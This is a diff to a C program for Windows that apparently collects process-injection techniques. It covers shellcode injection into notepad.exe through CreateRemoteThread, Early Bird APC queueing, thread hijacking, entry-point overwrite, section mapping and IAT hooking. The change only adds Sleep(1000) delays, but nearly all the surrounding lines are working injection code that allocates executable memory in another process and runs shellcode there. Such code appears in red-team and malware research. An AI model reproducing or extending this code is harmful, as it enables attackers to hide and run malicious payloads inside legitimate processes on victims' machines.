@@ -92,6 +92,7 @@ void CreateRemoteThread() { /* If notepad are open, inject and exec shellcode. I
 
 	}
 	if (flag == 0) return;
+	Sleep(1000);
 	remoteBuffer = VirtualAllocEx(processHandle, NULL, shellSize, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
 	BOOL check = WriteProcessMemory(processHandle, remoteBuffer, shellCode, shellSize, NULL);
 	remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
@@ -151,7 +152,7 @@ void EarlyBirdApcQueueCodeInjection() {
 	CreateProcessA(NULL, (LPSTR)"notepad.exe", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
 	HANDLE victimProcess = pi.hProcess;
 	HANDLE threadHandle = pi.hThread;
-
+	Sleep(1000);
 	LPVOID shellAddress = VirtualAllocEx(victimProcess, NULL, shellSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 	PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;
 
@@ -201,7 +202,7 @@ void InjectingRemoteProcessViaThreadHijacking() { /* Remote Process will be susp
 
 	}
 	if (flag == 0) return;
-
+	Sleep(1000);
 	context.ContextFlags = CONTEXT_FULL;
 	threadEntry.dwSize = sizeof(THREADENTRY32);
 	remoteBuffer = VirtualAllocEx(targetProcessHandle, NULL, shellSize, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
@@ -255,7 +256,7 @@ void AddressOfEntryPointCodeInjectionWithoutVirtualAlloc() {
 	// write shellcode to image entry point and execute it
 	WriteProcessMemory(pi.hProcess, codeEntry, shellCode, shellSize, NULL);
 	ResumeThread(pi.hThread);
-
+	Sleep(1000);
 }
 
 void ImportAdressTableHooking() {
@@ -353,7 +354,7 @@ void ShareMemoryInjection() {
 	PROCESS_BASIC_INFORMATION pbi = {};
 	DWORD returnLength = 0;
 	CreateProcessA(0, (LPSTR)"notepad.exe", 0, 0, 0, 0, 0, 0, &si, &pi);
-
+	Sleep(1000);
 	myNtCreateSection fNtCreateSection = (myNtCreateSection)(GetProcAddress(GetModuleHandleA("ntdll"), "NtCreateSection"));
 	myNtMapViewOfSection fNtMapViewOfSection = (myNtMapViewOfSection)(GetProcAddress(GetModuleHandleA("ntdll"), "NtMapViewOfSection"));
 	myRtlCreateUserThread fRtlCreateUserThread = (myRtlCreateUserThread)(GetProcAddress(GetModuleHandleA("ntdll"), "RtlCreateUserThread"));
@@ -387,7 +388,7 @@ void ForciblyMapASectionWritePrimitive() {
 	
 	
 	CreateProcessA(0, (LPSTR)"notepad.exe", 0, 0, 0, 0, 0, 0, &si, &pi);
-
+	Sleep(1000);
 	HANDLE fm = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, shellSize, NULL); 
 	LPVOID map_addr = MapViewOfFile(fm, FILE_MAP_ALL_ACCESS, 0, 0, 0);
 	
